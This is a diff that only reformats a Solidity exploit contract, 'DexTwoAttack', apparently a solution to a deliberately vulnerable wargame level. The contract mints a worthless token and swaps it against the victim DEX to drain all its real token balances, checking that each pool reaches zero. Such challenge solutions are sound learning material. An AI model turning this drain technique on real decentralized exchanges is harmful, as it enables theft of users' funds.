@@ -10,13 +10,7 @@ contract DexTwoAttack is ERC20 {
     IDexTwo private immutable victimDexTwo;
 
     constructor(IDexTwo victimDexTwo_) ERC20("DexTwo", "DT") {
-        _mint(
-            address(this),
-            victimDexTwo_.balanceOf(
-                victimDexTwo_.token2(),
-                address(victimDexTwo_)
-            ) * 2
-        );
+        _mint(address(this), victimDexTwo_.balanceOf(victimDexTwo_.token2(), address(victimDexTwo_)) * 2);
 
         victimDexTwo = victimDexTwo_;
     }
@@ -41,16 +35,9 @@ contract DexTwoAttack is ERC20 {
         ];
 
         for (uint256 i; i < tokens.length; ) {
-            victimDexTwo.swap(
-                address(this),
-                address(tokens[i]),
-                tokens[i].balanceOf(address(victimDexTwo))
-            );
+            victimDexTwo.swap(address(this), address(tokens[i]), tokens[i].balanceOf(address(victimDexTwo)));
 
-            require(
-                0 == tokens[i].balanceOf(address(victimDexTwo)),
-                "DexTwo: Attack failed"
-            );
+            require(0 == tokens[i].balanceOf(address(victimDexTwo)), "DexTwo: Attack failed");
 
             unchecked {
                 ++i;
